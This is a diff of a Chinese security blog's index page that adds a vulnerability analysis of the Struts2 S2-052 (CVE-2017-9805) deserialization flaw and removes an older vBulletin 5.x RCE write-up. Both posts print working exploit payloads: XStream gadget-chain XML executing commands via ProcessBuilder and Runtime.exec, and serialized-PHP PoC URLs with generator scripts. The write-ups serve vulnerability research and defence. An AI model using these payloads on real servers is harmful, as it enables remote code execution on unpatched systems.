@@ -53,7 +53,7 @@
         
           <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Zoeken"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
@@ -63,6 +63,300 @@
 </header>
       <div class="outer">
         <section id="main">
+  
+    <article id="post-Struts2-S2-052远程代码执行漏洞分析-CVE-2017-9805" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/10/Struts2-S2-052远程代码执行漏洞分析-CVE-2017-9805/" class="article-date">
+  <time datetime="2017-09-10T13:32:30.000Z" itemprop="datePublished">2017-09-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/09/10/Struts2-S2-052远程代码执行漏洞分析-CVE-2017-9805/">Struts2 S2-052远程代码执行漏洞分析 CVE-2017-9805</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-漏洞介绍"><a href="#0x00-漏洞介绍" class="headerlink" title="0x00 漏洞介绍"></a>0x00 漏洞介绍</h2><p>Struts2 S2-052远程代码执行漏洞和以往的Struts2漏洞是不同的，S2-052利用的是Java反序列化漏洞，而不是臭名昭著的ognl。本次漏洞触发点是REST插件在解析请求中的xml文件时，调用了XStreamHandler，传入的数据会被默认进行反序列化，如果当传入的xml是个经过XStream序列化的恶意对象时，便造成反序列化漏洞。</p>
+<p>本次漏洞最精彩的地方是漏洞利用，具体参考接下来的文章。</p>
+<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>本次漏洞的成因有两部分组成，一个是 Struts2 REST插件本身没有对进入的数据进行安全检查，导致攻击者可以传入恶意的xml对象可以传入到XStream里。另一个是XStream在反序列化传入的xml造成的远程代码执行。</p>
+<p>关键代码在org.apache.struts2.rest.ContentTypeInterceptor里</p>
+<pre><code>public String intercept(ActionInvocation invocation) throws Exception {
+    HttpServletRequest request = ServletActionContext.getRequest();
+    ContentTypeHandler handler = selector.getHandlerForRequest(request);
+
+    Object target = invocation.getAction();
+    if (target instanceof ModelDriven) {
+        target = ((ModelDriven)target).getModel();
+    }
+
+    if (request.getContentLength() &gt; 0) {
+        InputStream is = request.getInputStream();
+        InputStreamReader reader = new InputStreamReader(is);
+        handler.toObject(reader, target);
+    }
+    return invocation.invoke();
+}
+</code></pre><p>问题出在以下两点</p>
+<ol>
+<li>ContentTypeHandler handler = selector.getHandlerForRequest(request);</li>
+<li>handler.toObject(reader, target);</li>
+</ol>
+<p>Struts2的漏洞点本身没什么难度，这个漏洞精彩的地方是漏洞利用方面。</p>
+<h2 id="0x02-利用分析"><a href="#0x02-利用分析" class="headerlink" title="0x02 利用分析"></a>0x02 利用分析</h2><p>本次漏洞，最开始的poc生成是利用marshalsec工具生成ImageIO的远程代码序列化对象，这个poc适用的环境是java1.8以上，这是个非常苛刻的条件。</p>
+<p>利用的具体代码如下：</p>
+<pre><code>&lt;map&gt;
+  &lt;entry&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString&gt;
+      &lt;flags&gt;0&lt;/flags&gt;
+      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;
+        &lt;dataHandler&gt;
+          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;
+            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;
+              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;
+                &lt;initialized&gt;false&lt;/initialized&gt;
+                &lt;opmode&gt;0&lt;/opmode&gt;
+                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
+                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
+                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;
+                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;
+                      &lt;command&gt;
+                        &lt;string&gt;touch&lt;/string&gt;
+                        &lt;string&gt;/tmp/pwn&lt;/string&gt;
+                      &lt;/command&gt;
+                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
+                    &lt;/next&gt;
+                  &lt;/iter&gt;
+                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;
+                    &lt;method&gt;
+                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;
+                      &lt;name&gt;start&lt;/name&gt;
+                      &lt;parameter-types/&gt;
+                    &lt;/method&gt;
+                    &lt;name&gt;foo&lt;/name&gt;
+                  &lt;/filter&gt;
+                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;
+                &lt;/serviceIterator&gt;
+                &lt;lock/&gt;
+              &lt;/cipher&gt;
+              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;
+              &lt;ibuffer&gt;&lt;/ibuffer&gt;
+              &lt;done&gt;false&lt;/done&gt;
+              &lt;ostart&gt;0&lt;/ostart&gt;
+              &lt;ofinish&gt;0&lt;/ofinish&gt;
+              &lt;closed&gt;false&lt;/closed&gt;
+            &lt;/is&gt;
+            &lt;consumed&gt;false&lt;/consumed&gt;
+          &lt;/dataSource&gt;
+          &lt;transferFlavors/&gt;
+        &lt;/dataHandler&gt;
+        &lt;dataLen&gt;0&lt;/dataLen&gt;
+      &lt;/value&gt;
+    &lt;/jdk.nashorn.internal.objects.NativeString&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;
+  &lt;/entry&gt;
+  &lt;entry&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
+  &lt;/entry&gt;
+&lt;/map&gt;
+</code></pre><p>这个利用代码利用了在 Java1.8 环境下，ImageIO库的反序列化漏洞，因此利用这个poc在线网上，是很少能打到目标的。ImageIO的利用分析参考阿里大牛的分析 <a href="https://m.aliyun.com/yunqi/articles/197926?from=timeline&amp;isappinstalled=0" target="_blank" rel="external">CVE-2017-9805:Struts2 REST插件远程执行命令漏洞(S2-052) 分析报告</a></p>
+<p>线上环境使用 Java 1.8 是个非常苛刻的条件，然而有没有在其他版本java的利用代码呢？答案是有的。漏洞的本质是反序列化漏洞，而反序列化工具ysoserial提供了大量的反序列化代码。通过查看marshalsec工具生成XStream的代码，发现利用下面代码再结合ysoserial工具的代码，即可生成更多的利用代码。</p>
+<pre><code>public class XStream extends MarshallerBase&lt;String&gt; implements CommonsConfiguration, Rome, CommonsBeanutils, ServiceLoader, ImageIO,
+        BindingEnumeration, LazySearchEnumeration, SpringAbstractBeanFactoryPointcutAdvisor, SpringPartiallyComparableAdvisorHolder, Resin, XBean {
+
+
+    @Override
+    public String marshal ( Object o ) throws Exception {
+        com.thoughtworks.xstream.XStream xs = new com.thoughtworks.xstream.XStream();
+        return xs.toXML(o);
+    }
+
+    @Override
+    public Object unmarshal ( String data ) throws Exception {
+        com.thoughtworks.xstream.XStream xs = new com.thoughtworks.xstream.XStream();
+        return xs.fromXML(data);
+    }
+
+    @Override
+    public Object makeComparatorTrigger ( Object tgt, Comparator&lt;?&gt; cmp ) throws Exception {
+        return JDKUtil.makePriorityQueue(tgt, cmp);
+    }
+
+
+    public static void main ( String[] args ) {
+        new XStream().run(args);
+    }
+}
+</code></pre><p>利用commons.collections系列和XStream可以生成在java1.7环境下稳定利用的poc。生成poc的利用代码如下：</p>
+<pre><code>反序列化后会得到 object
+com.thoughtworks.xstream.XStream xs = new com.thoughtworks.xstream.XStream();
+String payload = xs.toXML(object);
+System.out.println(payload);
+</code></pre><h3 id="具体的利用代码如下"><a href="#具体的利用代码如下" class="headerlink" title="具体的利用代码如下"></a>具体的利用代码如下</h3><p>CommonsCollections5 + XStream 的利用</p>
+<pre><code>&lt;javax.management.BadAttributeValueExpException&gt;
+  &lt;stackTrace&gt;
+    &lt;trace&gt;ysoserial.payloads.CommonsCollections5.getObject(CommonsCollections5.java:85)&lt;/trace&gt;
+    &lt;trace&gt;ysoserial.payloads.CommonsCollections5.getObject(CommonsCollections5.java:1)&lt;/trace&gt;
+    &lt;trace&gt;ysoserial.payloads.util.PayloadRunner$1.call(PayloadRunner.java:28)&lt;/trace&gt;
+    &lt;trace&gt;ysoserial.payloads.util.PayloadRunner$1.call(PayloadRunner.java:1)&lt;/trace&gt;
+    &lt;trace&gt;ysoserial.secmgr.ExecCheckingSecurityManager.callWrapped(ExecCheckingSecurityManager.java:72)&lt;/trace&gt;
+    &lt;trace&gt;ysoserial.payloads.util.PayloadRunner.run(PayloadRunner.java:21)&lt;/trace&gt;
+    &lt;trace&gt;ysoserial.payloads.CommonsCollections5.main(CommonsCollections5.java:101)&lt;/trace&gt;
+  &lt;/stackTrace&gt;
+  &lt;suppressedExceptions class=&quot;java.util.Collections$UnmodifiableRandomAccessList&quot; resolves-to=&quot;java.util.Collections$UnmodifiableList&quot;&gt;
+    &lt;c class=&quot;list&quot;/&gt;
+    &lt;list reference=&quot;../c&quot;/&gt;
+  &lt;/suppressedExceptions&gt;
+  &lt;val class=&quot;org.apache.commons.collections.keyvalue.TiedMapEntry&quot;&gt;
+    &lt;map class=&quot;org.apache.commons.collections.map.LazyMap&quot; serialization=&quot;custom&quot;&gt;
+      &lt;unserializable-parents/&gt;
+      &lt;org.apache.commons.collections.map.LazyMap&gt;
+        &lt;default&gt;
+          &lt;factory class=&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;&gt;
+            &lt;iTransformers&gt;
+              &lt;org.apache.commons.collections.functors.ConstantTransformer&gt;
+                &lt;iConstant class=&quot;java-class&quot;&gt;java.lang.Runtime&lt;/iConstant&gt;
+              &lt;/org.apache.commons.collections.functors.ConstantTransformer&gt;
+              &lt;org.apache.commons.collections.functors.InvokerTransformer&gt;
+                &lt;iMethodName&gt;getMethod&lt;/iMethodName&gt;
+                &lt;iParamTypes&gt;
+                  &lt;java-class&gt;java.lang.String&lt;/java-class&gt;
+                  &lt;java-class&gt;[Ljava.lang.Class;&lt;/java-class&gt;
+                &lt;/iParamTypes&gt;
+                &lt;iArgs&gt;
+                  &lt;string&gt;getRuntime&lt;/string&gt;
+                  &lt;java-class-array/&gt;
+                &lt;/iArgs&gt;
+              &lt;/org.apache.commons.collections.functors.InvokerTransformer&gt;
+              &lt;org.apache.commons.collections.functors.InvokerTransformer&gt;
+                &lt;iMethodName&gt;invoke&lt;/iMethodName&gt;
+                &lt;iParamTypes&gt;
+                  &lt;java-class&gt;java.lang.Object&lt;/java-class&gt;
+                  &lt;java-class&gt;[Ljava.lang.Object;&lt;/java-class&gt;
+                &lt;/iParamTypes&gt;
+                &lt;iArgs&gt;
+                  &lt;null/&gt;
+                  &lt;object-array/&gt;
+                &lt;/iArgs&gt;
+              &lt;/org.apache.commons.collections.functors.InvokerTransformer&gt;
+              &lt;org.apache.commons.collections.functors.InvokerTransformer&gt;
+                &lt;iMethodName&gt;exec&lt;/iMethodName&gt;
+                &lt;iParamTypes&gt;
+                  &lt;java-class&gt;java.lang.String&lt;/java-class&gt;
+                &lt;/iParamTypes&gt;
+                &lt;iArgs class=&quot;string-array&quot;&gt;
+                  &lt;string&gt;touch /tmp/jdk1111&lt;/string&gt;
+                &lt;/iArgs&gt;
+              &lt;/org.apache.commons.collections.functors.InvokerTransformer&gt;
+              &lt;org.apache.commons.collections.functors.ConstantTransformer&gt;
+                &lt;iConstant class=&quot;int&quot;&gt;1&lt;/iConstant&gt;
+              &lt;/org.apache.commons.collections.functors.ConstantTransformer&gt;
+            &lt;/iTransformers&gt;
+          &lt;/factory&gt;
+        &lt;/default&gt;
+        &lt;map/&gt;
+      &lt;/org.apache.commons.collections.map.LazyMap&gt;
+    &lt;/map&gt;
+    &lt;key class=&quot;string&quot;&gt;foo&lt;/key&gt;
+  &lt;/val&gt;
+&lt;/javax.management.BadAttributeValueExpException&gt;
+</code></pre><p>CommonsCollections6 + XStream 的利用</p>
+<pre><code>&lt;set&gt;
+  &lt;org.apache.commons.collections.keyvalue.TiedMapEntry&gt;
+    &lt;map class=&quot;org.apache.commons.collections.map.LazyMap&quot; serialization=&quot;custom&quot;&gt;
+      &lt;unserializable-parents/&gt;
+      &lt;org.apache.commons.collections.map.LazyMap&gt;
+        &lt;default&gt;
+          &lt;factory class=&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;&gt;
+            &lt;iTransformers&gt;
+              &lt;org.apache.commons.collections.functors.ConstantTransformer&gt;
+                &lt;iConstant class=&quot;java-class&quot;&gt;java.lang.Runtime&lt;/iConstant&gt;
+              &lt;/org.apache.commons.collections.functors.ConstantTransformer&gt;
+              &lt;org.apache.commons.collections.functors.InvokerTransformer&gt;
+                &lt;iMethodName&gt;getMethod&lt;/iMethodName&gt;
+                &lt;iParamTypes&gt;
+                  &lt;java-class&gt;java.lang.String&lt;/java-class&gt;
+                  &lt;java-class&gt;[Ljava.lang.Class;&lt;/java-class&gt;
+                &lt;/iParamTypes&gt;
+                &lt;iArgs&gt;
+                  &lt;string&gt;getRuntime&lt;/string&gt;
+                  &lt;java-class-array/&gt;
+                &lt;/iArgs&gt;
+              &lt;/org.apache.commons.collections.functors.InvokerTransformer&gt;
+              &lt;org.apache.commons.collections.functors.InvokerTransformer&gt;
+                &lt;iMethodName&gt;invoke&lt;/iMethodName&gt;
+                &lt;iParamTypes&gt;
+                  &lt;java-class&gt;java.lang.Object&lt;/java-class&gt;
+                  &lt;java-class&gt;[Ljava.lang.Object;&lt;/java-class&gt;
+                &lt;/iParamTypes&gt;
+                &lt;iArgs&gt;
+                  &lt;null/&gt;
+                  &lt;object-array/&gt;
+                &lt;/iArgs&gt;
+              &lt;/org.apache.commons.collections.functors.InvokerTransformer&gt;
+              &lt;org.apache.commons.collections.functors.InvokerTransformer&gt;
+                &lt;iMethodName&gt;exec&lt;/iMethodName&gt;
+                &lt;iParamTypes&gt;
+                  &lt;java-class&gt;java.lang.String&lt;/java-class&gt;
+                &lt;/iParamTypes&gt;
+                &lt;iArgs class=&quot;string-array&quot;&gt;
+                  &lt;string&gt;touch /tmp/manning123&lt;/string&gt;
+                &lt;/iArgs&gt;
+              &lt;/org.apache.commons.collections.functors.InvokerTransformer&gt;
+              &lt;org.apache.commons.collections.functors.ConstantTransformer&gt;
+                &lt;iConstant class=&quot;int&quot;&gt;1&lt;/iConstant&gt;
+              &lt;/org.apache.commons.collections.functors.ConstantTransformer&gt;
+            &lt;/iTransformers&gt;
+          &lt;/factory&gt;
+        &lt;/default&gt;
+        &lt;map/&gt;
+      &lt;/org.apache.commons.collections.map.LazyMap&gt;
+    &lt;/map&gt;
+    &lt;key class=&quot;string&quot;&gt;foo&lt;/key&gt;
+  &lt;/org.apache.commons.collections.keyvalue.TiedMapEntry&gt;
+&lt;/set&gt;
+</code></pre><p>利用的效果图展示</p>
+<p><img src="/2017/09/10/Struts2-S2-052远程代码执行漏洞分析-CVE-2017-9805/1.png" width="90%"></p>
+<p>在实验中，执行的代码为：</p>
+<pre><code>touch /tmp/manning_s2_052
+</code></pre><p>在poc打过去后，我们可以在tmp目录发现 manning_s2_052 文件</p>
+<p><img src="/2017/09/10/Struts2-S2-052远程代码执行漏洞分析-CVE-2017-9805/2.png" width="90%"></p>
+<p>之前我在微博说利用可能达到11种，这个说法现在来看不准确，理论上marshalsec和ysoserial和SerialKillerBypassGadgetCollection的反序列化利用代码可以在本次的漏洞使用，因此本次漏洞的利用的变化是非常大的。</p>
+<p>之前同事提出了一个观点</p>
+<pre><code>所有的struts2都有那个组件？，毕竟这个是依赖common-collections3组件，showcase是默认有，其它strtus2的应用有没有啊？
+</code></pre><p>针对这个问题，我的看法是</p>
+<pre><code>strust2 默认不带这个库，不过很有可能项目中用到的其它库会依赖 collections，毕竟这个库使用量太大，所以感觉应该比 jdk8 更适用一些。
+</code></pre><h2 id="0x03-漏洞防御"><a href="#0x03-漏洞防御" class="headerlink" title="0x03 漏洞防御"></a>0x03 漏洞防御</h2><p>由于漏洞利用变化极大，建议暂时关闭有REST插件的Struts2站点。</p>
+<h2 id="0x04-参考内容"><a href="#0x04-参考内容" class="headerlink" title="0x04 参考内容"></a>0x04 参考内容</h2><p><a href="https://0bin.net/paste/xI3qQXBnBFi+ZIC6#y151P6VdT9DXPOBqgQviWRECRnW6+gSuK+frvsnAfZy" target="_blank" rel="external">https://0bin.net/paste/xI3qQXBnBFi+ZIC6#y151P6VdT9DXPOBqgQviWRECRnW6+gSuK+frvsnAfZy</a></p>
+<p><a href="http://bobao.360.cn/learning/detail/4372.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4372.html</a></p>
+<p><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="external">https://github.com/mbechler/marshalsec</a></p>
+<p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="external">https://github.com/frohoff/ysoserial</a></p>
+<p><a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet" target="_blank" rel="external">https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet</a></p>
+<p><a href="https://github.com/pwntester/SerialKillerBypassGadgetCollection" target="_blank" rel="external">https://github.com/pwntester/SerialKillerBypassGadgetCollection</a></p>
+<p><a href="https://github.com/pwntester/XStreamPOC" target="_blank" rel="external">https://github.com/pwntester/XStreamPOC</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/09/10/Struts2-S2-052远程代码执行漏洞分析-CVE-2017-9805/" data-id="cja2isuhe0008rv02lnqmnojg" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
   
     <article id="post-三种特征向量对深度学习攻击检测的影响" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -163,7 +457,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/08/08/三种特征向量对深度学习攻击检测的影响/" data-id="cj63ggoxy0009htfys12u651i" class="article-share-link">Delen</a>
+      <a data-url="http://yoursite.com/2017/08/08/三种特征向量对深度学习攻击检测的影响/" data-id="cja2isuhk0009rv02t80tgg17" class="article-share-link">Share</a>
       
       
     </footer>
@@ -271,7 +565,7 @@ print_r($aa);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/06/28/Drupal-Core-CVE-2017-6920-远程代码执行漏洞分析/" data-id="cj63ggox10002htfyrynw1ibl" class="article-share-link">Delen</a>
+      <a data-url="http://yoursite.com/2017/06/28/Drupal-Core-CVE-2017-6920-远程代码执行漏洞分析/" data-id="cja2isugh0001rv02vj991kx3" class="article-share-link">Share</a>
       
       
     </footer>
@@ -341,7 +635,7 @@ print_r($aa);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/06/22/Rise-of-the-machines读后感/" data-id="cj63ggoxc0004htfyyedrvu69" class="article-share-link">Delen</a>
+      <a data-url="http://yoursite.com/2017/06/22/Rise-of-the-machines读后感/" data-id="cja2isugo0003rv0244dsow1d" class="article-share-link">Share</a>
       
       
     </footer>
@@ -486,7 +780,7 @@ print_r($aa);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/06/13/Spring-Web-Flow-RCE漏洞分析/" data-id="cj63ggoxf0005htfytrmpskn4" class="article-share-link">Delen</a>
+      <a data-url="http://yoursite.com/2017/06/13/Spring-Web-Flow-RCE漏洞分析/" data-id="cja2isuh40006rv02pgl1yqte" class="article-share-link">Share</a>
       
       
     </footer>
@@ -643,7 +937,7 @@ print_r($aa);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/05/05/WordPress-4-6版本远程代码执行漏洞/" data-id="cj63ggoxt0008htfymunr88dj" class="article-share-link">Delen</a>
+      <a data-url="http://yoursite.com/2017/05/05/WordPress-4-6版本远程代码执行漏洞/" data-id="cja2isuht000arv024y690euq" class="article-share-link">Share</a>
       
       
     </footer>
@@ -794,7 +1088,7 @@ print_r($aa);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/03/21/Struts2-S046命令执行漏洞/" data-id="cj63ggoxo0007htfyra2xnohg" class="article-share-link">Delen</a>
+      <a data-url="http://yoursite.com/2017/03/21/Struts2-S046命令执行漏洞/" data-id="cja2isuh80007rv02p5e9eaqh" class="article-share-link">Share</a>
       
       
     </footer>
@@ -922,7 +1216,7 @@ print_r($aa);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/03/08/Struts2-Jakarta模块Content-type命令执行漏洞-CVE-2017-5638/" data-id="cj63ggoxj0006htfyx1l9cone" class="article-share-link">Delen</a>
+      <a data-url="http://yoursite.com/2017/03/08/Struts2-Jakarta模块Content-type命令执行漏洞-CVE-2017-5638/" data-id="cja2isuh00005rv02uwo1uyfd" class="article-share-link">Share</a>
       
       
     </footer>
@@ -1007,7 +1301,7 @@ print_r($aa);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/05/05/ImageMagic初步分析/" data-id="cj63ggowz0001htfyohtjxvhc" class="article-share-link">Delen</a>
+      <a data-url="http://yoursite.com/2016/05/05/ImageMagic初步分析/" data-id="cja2isugj0002rv02hhrky5oj" class="article-share-link">Share</a>
       
       
     </footer>
@@ -1122,261 +1416,7 @@ print_r($aa);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/12/22/Java反序列化内容/" data-id="cj63ggox70003htfy2dz61bis" class="article-share-link">Delen</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-vBulletin-5-0-x-5-1-x-RCE" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2015/11/10/vBulletin-5-0-x-5-1-x-RCE/" class="article-date">
-  <time datetime="2015-11-10T07:16:42.000Z" itemprop="datePublished">2015-11-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/11/10/vBulletin-5-0-x-5-1-x-RCE/">vBulletin 5.0.x - 5.1.x RCE</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>0x00 漏洞综述<br>-</p>
-<p>vBulletin 是一个强大，灵活并可完全根据自己的需要定制的论坛程序套件。它使用目前发展速度最快的 Web 脚本语言php编写，并且基于以高效和疾速著称的数据库引擎 MySQL。并且是世界上用户非常广泛的PHP论坛 。</p>
-<p>vBulletin在其ajax接口使用了反序列化函数unserialize。导致存在漏洞，可以覆盖其上下文中使用的类的类变量，导致可以产生各类问题。</p>
-<p>0x01 漏洞分析<br>-</p>
-<h4 id="1，漏洞本质问题"><a href="#1，漏洞本质问题" class="headerlink" title="1，漏洞本质问题"></a>1，漏洞本质问题</h4><p>hook.php文件的vB_Api_Hook类的decodeArguments方法，传入的值会被进行反序列化操作。并且攻击者还可以控制传入的$arguments的值，因此漏洞的全部演出从这里开始。</p>
-<pre><code>public function decodeArguments($arguments)
-{
- =》if ($args = @unserialize($arguments))
-    {
-        ...
-</code></pre><h4 id="2，反序列化后对上下文变量覆盖的利用"><a href="#2，反序列化后对上下文变量覆盖的利用" class="headerlink" title="2，反序列化后对上下文变量覆盖的利用"></a>2，反序列化后对上下文变量覆盖的利用</h4><h4 id="POC角度分析"><a href="#POC角度分析" class="headerlink" title="POC角度分析"></a>POC角度分析</h4><pre><code>http://192.168.103.129/vBulletin/upload/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A21%3A%22print%28%27Hello+world%21%27%29%22%3B%7D
-</code></pre><p>对URL进行分解，path为vBulletin对参数进行路由转换的结果，本质也是mvc调用，vBulletin处理的格式为<strong>ajax/api/[controller]/[method]</strong>，也就是说此访问页面调用的是<strong>hook文件的decodeArgument方法</strong>。query内只有一个参数，参数的名称为arguments，参数的值为一段序列化的代码。</p>
-<p>看下输出序列化值的代码</p>
-<pre><code>&lt;?php
-class vB_Database_MySQL {
-   public $functions = array();
-   public function __construct() {
-           $this-&gt;functions[&apos;free_result&apos;] = &apos;assert&apos;;
-   }
-}
-
-class vB_dB_Result {
-   protected $db;
-   protected $recordset;
-   public function __construct() {
-           $this-&gt;db = new vB_Database_MySQL();
-           $this-&gt;recordset = &apos;print(\&apos;Hello world!\&apos;)&apos;;
-   }
-}
-
-
-print urlencode(serialize(new vB_dB_Result())) . &quot;\n&quot;;
-
-?&gt;
-</code></pre><p>最终输出的是 <code>serialize(new vB_dB_Result())</code>的值，类vB_dB_Result定义了两个protected变量，并且其构造函数对这两个protected变量进行复制，$recordset赋值为一段字符串，从poc也可看出来，$recordset的值就是要执行的代码片段。$db的赋值为vB_Database_MySQL，定义了一个数组类型的变量$functions，并给这个数组的free_result索引赋值为assert。因此可以对此进行下小结，vBulletin通过对传值进行反序列化操作，可以对其执行上下文中的变量进行覆盖。覆盖后，会产生代码执行漏洞。</p>
-<h4 id="代码角度分析"><a href="#代码角度分析" class="headerlink" title="代码角度分析"></a>代码角度分析</h4><p>首先进入hook.php文件的vB_Api_Hook类的decodeArguments方法，传入的值会被进行反序列化操作。变量$args会被赋值为vB_Database_Result类。</p>
-<pre><code>public function decodeArguments($arguments)
-{
- =》if ($args = @unserialize($arguments))
-    {
-        $result = &apos;&apos;;
-
-        foreach ($args AS $varname =&gt; $value)
-        {
-            $result .= $varname;
-            ...
-</code></pre><p>接着进入foreach函数，由于$args为<strong>对象</strong>数据结构，并且当前类（vB_Database_Result类）implements于Iterator接口，因此当php在遍历对象$args时，便首先会调用其rewind()方法。<a href="http://php.net/manual/zh/control-structures.foreach.php" target="_blank" rel="external">foreach遍历对象</a>，<a href="http://php.net/manual/zh/language.oop5.iterations.php" target="_blank" rel="external">迭代器遍历</a>。以上两个链接详细讲解了php遍历对象操作的细节。</p>
-<pre><code>public function decodeArguments($arguments)
-{
-    if ($args = @unserialize($arguments))
-    {
-        $result = &apos;&apos;;
-
-     =》foreach ($args AS $varname =&gt; $value)
-        {
-            $result .= $varname;
-            ...
-</code></pre><p>然后跟入result.php的vB_Database_Result类的rewind()方法，此方法会调用当前类内的<strong>类变量$db的free_result方法</strong>，并且为其传入类变量$recordset的值。</p>
-<pre><code>public function rewind()
-{
-    if ($this-&gt;bof)
-    {
-        return;
-    }
-
-    if ($this-&gt;recordset)
-    {
-     =》$this-&gt;db-&gt;free_result($this-&gt;recordset);
-    }
-    ...
-</code></pre><p>最后跟入database.php的vB_Database类的free_result方法，由于控制了当前类（vB_Database类）的变量$functions[‘free_result’]，和传入的$queryresult，因此此处达成了动态函数执行，漏洞利用至此结束。</p>
-<pre><code>function free_result($queryresult)
-{
-    $this-&gt;sql = &apos;&apos;;
- =》return @$this-&gt;functions[&apos;free_result&apos;]($queryresult);
-}
-</code></pre><p><img src="/2015/11/10/vBulletin-5-0-x-5-1-x-RCE/1.png"></p>
-<h4 id="3，反序列化后利用魔术方法RCE的利用"><a href="#3，反序列化后利用魔术方法RCE的利用" class="headerlink" title="3，反序列化后利用魔术方法RCE的利用"></a>3，反序列化后利用魔术方法RCE的利用</h4><h4 id="POC角度分析-1"><a href="#POC角度分析-1" class="headerlink" title="POC角度分析"></a>POC角度分析</h4><pre><code>http://192.168.103.129/vBulletin/upload/ajax/api/hook/decodeArguments?arguments=O%3A7%3A%22vB_vURL%22%3A1%3A%7Bs%3A7%3A%22tmpfile%22%3BO%3A16%3A%22vB_View_AJAXHTML%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00content%22%3BO%3A12%3A%22vB5_Template%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00template%22%3Bs%3A10%3A%22widget_php%22%3Bs%3A13%3A%22%00%2A%00registered%22%3Ba%3A1%3A%7Bs%3A12%3A%22widgetConfig%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22phpinfo%28%29%3Bdie%28%29%3B%22%3B%7D%7D%7D%7D%7D
-</code></pre><p>POC如上，同理上文的路径分析。</p>
-<p>看下输出序列化值的代码</p>
-<pre><code>&lt;?php
-class vB5_Template {
-    public $tmpfile;
-    protected $template;
-    protected $registered = array();
-    public function __construct() {
-        $this-&gt;template = &apos;widget_php&apos;;
-        $this-&gt;registered[&apos;widgetConfig&apos;] = array(&apos;code&apos; =&gt; &apos;print_r(\&apos;hello manning\&apos;);die();&apos;);
-   }
-}
-
-class vB_View_AJAXHTML {
-    public $tmpfile;
-    protected $content;
-    public function __construct() {
-        $this-&gt;content = new vB5_Template();
-   }
-}
-
-class vB_vURL {
-    public $tmpfile;
-    public function __construct() {
-        $this-&gt;tmpfile = new vB_View_AJAXHTML();
-    }
-}
-
-print urlencode(serialize(new vB_vURL())) . &quot;\n&quot;;
-?&gt;    
